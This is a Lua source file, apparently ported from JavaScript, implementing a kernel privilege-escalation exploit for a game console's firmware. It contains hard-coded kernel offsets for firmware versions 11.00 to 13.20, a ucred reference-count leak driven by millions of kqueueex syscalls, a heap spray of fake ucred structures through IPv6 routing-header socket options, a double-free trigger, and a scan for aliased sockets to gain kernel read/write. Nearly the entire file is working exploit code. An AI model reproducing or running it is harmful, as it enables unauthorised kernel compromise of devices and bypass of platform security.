--lua port

local originalNotify = send_notification

local notificationShown = false

-- Override send_notification
function send_notification(msg)
    -- Check if msg contains "Remote JS Loader"
    if msg and string.find(msg, "Remote JS Loader", 1, true) then
        if notificationShown then
            return -- suppress duplicate
        end
        notificationShown = true
    end
    return originalNotify(msg)
end

-- Define an error handler
local function errorHandler(err)
    print("Error: " .. tostring(err))
end

-- Protected block
local function configBlock()
    -- ====================== CONFIG ======================
    local FDS_TO_STAGE   = 64
    local SPRAY_COUNT    = 1000
    local CR_REF_BASE    = 2
    local REPORT_INTERVAL = 50000000
    local CHUNK_SIZE     = 50000000

    local SYS_KQUEUEEX   = 0xCB
    local UCRED_SIZE     = 0x168
    local RTHDR_TAG      = 0x13370000

    local AF_INET6       = 28
    local SOCK_DGRAM     = 2
    local IPPROTO_UDP    = 17
    local IPPROTO_IPV6   = 41
    local IPV6_RTHDR     = 51
    local IPV6_PKTINFO   = 46
    local IPV6_NEXTHOP   = 48

    -- Firmware-specific offsets (as a Lua table of arrays)
    local P2JB_OFFSETS = {
        ["11.00"] = {0x2875D70, 0xD8C064, 0x30B7510, 0x2E04F18, 0x2E66570},
        ["11.20"] = {0x2875D70, 0xD8C064, 0x30B7510, 0x2E04F18, 0x2E66570},
        ["11.40"] = {0x2875D70, 0xD8C064, 0x30B7510, 0x2E04F18, 0x2E66570},
        ["11.60"] = {0x2875D70, 0xD8C064, 0x30B7510, 0x2E04F18, 0x2E66570},
        ["12.00"] = {0x2885E00, 0xD83064, 0x30D7510, 0x2E1CFB8, 0x2E7E570},
        ["12.20"] = {0x2885E00, 0xD83064, 0x30D7510, 0x2E1CFB8, 0x2E7E570},
        ["13.00"] = {0x28C5E00, 0xD99064, 0x3133510, 0x2E74FF8, 0x2ED6570},
        ["13.20"] = {0x28C5E00, 0xD99064, 0x3133510, 0x2E74FF8, 0x2ED6570},
    }

    -- Example: print one value to show it works
    print("Config loaded, FDS_TO_STAGE = " .. FDS_TO_STAGE)
    local fw = FW_VERSION:match("^%s*(.-)%s*$")  -- trim whitespace
    send_notification(fw)
    local offsets = P2JB_OFFSETS[fw]

    if not offsets then
        error("Unsupported firmware: " .. fw)
    end

    -- Define kernel_offset as a Lua table
kernel_offset = {
    DATA_BASE      = offsets[1],  -- Lua arrays are 1-based
    ALLPROC        = offsets[2],
    SECURITY_FLAGS = offsets[3],
    ROOTVNODE      = offsets[4],
    GVMSPACE       = offsets[5],

    -- Common struct offsets
    PROC_FD        = 0x48,
    PROC_PID       = 0xBC,
    PROC_UCRED     = 0x40,
    PROC_VM_SPACE  = 0x200,

    FILEDESC_OFILES = 0x08,
    SO_PCB          = 0x18,
    INPCB_PKTOPTS   = 0x120,
}

-- Example logging (assuming you have a log function)
log("Firmware: " .. fw .. " | Kernel base offset: " .. string.format("0x%X", kernel_offset.DATA_BASE))

-- Helper function nanosleep
function nanosleep(ms)
    local ts = malloc(0x10)
    write64(ts, 0)
    write64(ts + 8, math.floor(ms * 1e6))
    syscall(SYSCALL.nanosleep, ts)
end

function buildRthdr(buf, size)
    -- JS: ((size >> 3) - 1) & ~1
    -- In Lua, ~1 is the bitwise NOT of 1
    local len = ((size >> 3) - 1) & ~1
    
    write8(buf, 0)
    write8(buf + 1, len)
    write8(buf + 2, 0)
    write8(buf + 3, len >> 1)
    
    return (len + 1) << 3
end
--STAGING 
-- Define empty tables
local stagedFds = {}
local spraySocks = {}

function stageFds()
    -- Log start
    log("Phase 2: Staging " .. FDS_TO_STAGE .. " file descriptors...")

    local path = "/dev/null"
    local pbuf = malloc(#path + 1)

    -- Write path string into buffer
    for i = 1, #path do
        write8(pbuf + (i - 1), string.byte(path, i))
    end
    write8(pbuf + #path, 0)

    -- Open FDs
    for i = 1, FDS_TO_STAGE do
        local fd = syscall(SYSCALL.open, pbuf, 0, 0)
        if fd == 0xFFFFFFFFFFFFFFFF then
            error("open() failed")
        end
        table.insert(stagedFds, tonumber(fd))
    end

    -- Log result
    log("  Staged " .. #stagedFds .. " FDs")
end
--staeg Fds need to be async

function sprayFakeUcreds()
    -- Log start
    log("Phase 4: Spraying " .. SPRAY_COUNT .. " fake ucreds...")

    local buf = malloc(UCRED_SIZE)

    -- Zero out buffer in 8‑byte chunks
    for i = 0, UCRED_SIZE - 1, 8 do
        write64(buf + i, 0)
    end

    -- cr_ref = 1
    write32(buf, 1)

    local rthdrLen = buildRthdr(buf, UCRED_SIZE)

    -- Spray sockets
    for i = 0, SPRAY_COUNT - 1 do
        local sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
        if sd == 0xFFFFFFFFFFFFFFFF then
            error("socket() failed")
        end
        table.insert(spraySocks, sd)

        write32(buf + 4, RTHDR_TAG | (i & 0x1FF))
        syscall(SYSCALL.setsockopt, sd, IPPROTO_IPV6, IPV6_RTHDR, buf, rthdrLen)
    end
end

function triggerDoubleFree()
    log("Phase 5: Triggering double-free...")

    local half = math.floor(#stagedFds / 2)

    -- Close first half
    for i = 1, half do
        syscall(SYSCALL.close, stagedFds[i])
    end
    nanosleep(10)

    -- Close second half
    for i = half + 1, #stagedFds do
        syscall(SYSCALL.close, stagedFds[i])
    end
    nanosleep(50)

    stagedFds = {}
end

-- ====================== KERNEL R/W SETUP ======================
local masterSock = -1
local victimSock = -1

function findTwin()
    log("Phase 6: Twin scan for aliased pktopts...")

    local buf = malloc(UCRED_SIZE)
    local rthdrLen = buildRthdr(buf, UCRED_SIZE)
    local TAG_OFF = 4

    -- Write unique tags
    for i = 1, #spraySocks do
        write32(buf + TAG_OFF, RTHDR_TAG | ( (i-1) & 0x1FF ))
        syscall(SYSCALL.setsockopt, spraySocks[i], IPPROTO_IPV6, IPV6_RTHDR, buf, rthdrLen)
    end

    -- Scan for alias
    for i = 1, #spraySocks do
        syscall(SYSCALL.getsockopt, spraySocks[i], IPPROTO_IPV6, IPV6_RTHDR, buf, malloc32(UCRED_SIZE))
        local tag = read32(buf + TAG_OFF) & 0xFFFFFFFF
        local j = tag & 0x1FF

        if ((tag >> 16) == (RTHDR_TAG >> 16)) and (j ~= ((i-1) & 0x1FF)) then
            masterSock = spraySocks[i]
            victimSock = spraySocks[j+1]  -- adjust for Lua’s 1-based indexing
            log("  Twin found: master=" .. (i-1) .. " → victim=" .. j)
            return true
        end
    end

    return false
end

-- Immediately evaluate and assign to openFds
local openFds = (function()
    local stat = malloc(0x80)
    local count = 0

    for fd = 0, 255 do
        if syscall(SYSCALL.fstat, fd, stat) == 0 then
            count = count + 1
        end
    end

    return count
end)()

-- Calculate targetLeaks (>>> 0 in JS means unsigned right shift, here we just keep it as integer math)
local targetLeaks = (0xFFFFFFFF - (CR_REF_BASE + openFds + FDS_TO_STAGE) + 1)

-- Log values
log("Starting exploit | open fds: " .. openFds .. " | leaks needed: " .. tostring(targetLeaks))

-- Verify sys_kqueueex works
local test = malloc(8)
write64(test, 0x74657374)

if syscall(SYS_KQUEUEEX, test) >= 0x8000000000000000 then
    error("sys_kqueueex blocked by sandbox")
end

    stageFds();

    log("Phase 1: Leaking ucred reference count...")

local badPtr = 0x800000000000
local startTime = os.clock()  -- seconds since program start

local done = 0
while done < targetLeaks do
    local chunk = math.min(CHUNK_SIZE, targetLeaks - done)

    for i = 1, chunk do
        syscall(SYS_KQUEUEEX, badPtr)
    end

    done = done + chunk

    if done % REPORT_INTERVAL == 0 then
        local elapsed = os.clock() - startTime
        local pct = string.format("%.1f", (done / targetLeaks) * 100)
        local eta = elapsed * (targetLeaks - done) / done
        log(pct .. "% | " .. string.format("%.1f", done / 1e6) ..
            "M calls | ETA: " .. math.floor(eta / 60) .. "m")
    end
end

-- Log completion
log("Leak phase complete in " .. math.floor((os.clock() - startTime) / 60) .. " minutes")

-- === Trigger UAF ===
syscall(SYSCALL.setuid, 0)
nanosleep(20)

sprayFakeUcreds()
nanosleep(50)
triggerDoubleFree()






--end of xpcall try
end

-- Run the block with error handling
local ok, result = xpcall(configBlock, errorHandler)

if ok then
    print("Config executed successfully")
else
    print("Config failed")
end


